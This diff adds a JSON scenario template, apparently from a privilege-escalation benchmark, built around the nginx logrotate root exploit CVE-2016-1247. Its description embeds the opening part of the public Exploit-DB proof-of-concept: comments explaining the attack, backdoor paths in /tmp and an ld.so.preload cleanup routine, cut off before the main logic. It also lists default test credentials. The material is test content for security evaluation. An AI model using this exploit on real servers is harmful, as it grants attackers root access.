@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_40768",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Nginx (Debian Based Distros + Gentoo) - 'logrotate' Local Privilege Escalation (CVE-2016-1247)\n\nExploit source code (40768.sh):\n```\n#!/bin/bash\n#\n# Nginx (Debian-based distros + Gentoo) - Root Privilege Escalation PoC Exploit\n# nginxed-root.sh (ver. 1.0)\n#\n# CVE-2016-1247\n#\n# Discovered and coded by:\n#\n# Dawid Golunski\n# dawid[at]legalhackers.com\n#\n# https://legalhackers.com\n#\n# Follow https://twitter.com/dawid_golunski for updates on this advisory.\n#\n# ---\n# This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu\n# as well as Gentoo etc.) to escalate their privileges from nginx web server user\n# (www-data) to root through unsafe error log handling.\n#\n# The exploit waits for Nginx server to be restarted or receive a USR1 signal.\n# On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)\n# script which is called daily by the cron.daily on default installations.\n# The restart should take place at 6:25am which is when cron.daily executes.\n# Attackers can therefore get a root shell automatically in 24h at most without any admin\n# interaction just by letting the exploit run till 6:25am assuming that daily logrotation\n# has been configured.\n#\n#\n# Exploit usage:\n# ./nginxed-root.sh path_to_nginx_error.log\n#\n# To trigger logrotation for testing the exploit, you can run the following command:\n#\n# /usr/sbin/logrotate -vf /etc/logrotate.d/nginx\n#\n# See the full advisory for details at:\n# https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html\n#\n# Video PoC:\n# https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html\n#\n#\n# Disclaimer:\n# For testing purposes only. Do no harm.\n#\n\nBACKDOORSH=\"/bin/bash\"\nBACKDOORPATH=\"/tmp/nginxrootsh\"\nPRIVESCLIB=\"/tmp/privesclib.so\"\nPRIVESCSRC=\"/tmp/privesclib.c\"\nSUIDBIN=\"/usr/bin/sudo\"\n\nfunction cleanexit {\n\t# Cleanup\n\techo -e \"\\n[+] Cleaning up...\"\n\trm -f $PRIVESCSRC\n\trm -f $PRIVESCLIB\n\trm -f $ERRORLOG\n\ttouch $ERRORLOG\n\tif [ -f /etc/ld.so.preload ]; then\n\t\techo -n > /etc/ld.so.preload\n\tfi\n\techo -e \"\\n[+] Job done. Exiting with code $1 \\n\"\n\texit $1\n}\n\nfunction ctrl_c() {\n        echo -e \"\\n[+] Ctrl+C pressed\"\n\tcleanexit 0\n}\n\n#intro\n\ncat <<_eascii_\n _______________________________\n< Is your server (N)jinxed ? ;o >\n -------------------------------\n           \\\n            \\          __---__\n                    _-       /--______\n               __--( /     \\ )XXXXXXXXXXX\\v.\n             .-XXX(   O   O  )XXXXXXXXXXXXXXX-\n            /XXX(       U     )        XXXXXXX\\\n          /XXXXX(              )--_  XXXXXXXXXXX\\\n         /XXXXX/ (      O     )   XXXXXX   \\XXXXX\\\n         XXXXX/   /            XXXXXX   \\__ \\XXXXX\n         XXXXXX__/          XXXXXX         \\__---->\n ---___  XXX__/          XXXXXX      \\__         /\n   \\-  --__/   ___/\\  XXXXXX            /  ___--/=\n    \\-\\    ___/    XXXXXX              '--- XXXXXX\n       \\-\\/XXX\\ XXXXXX                      /XXXXX\n         \\XXXXXXXXX   \\                    /XXXXX/\n          \\XXXXXX      >                 _/XXXXX/\n            \\XXXXX--__/              __-- XXXX/\n             -XXXXXXXX---------------  XX\n```",
+  "cve": "CVE-2016-1247",
+  "exploitdb_id": "40768",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_40768",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
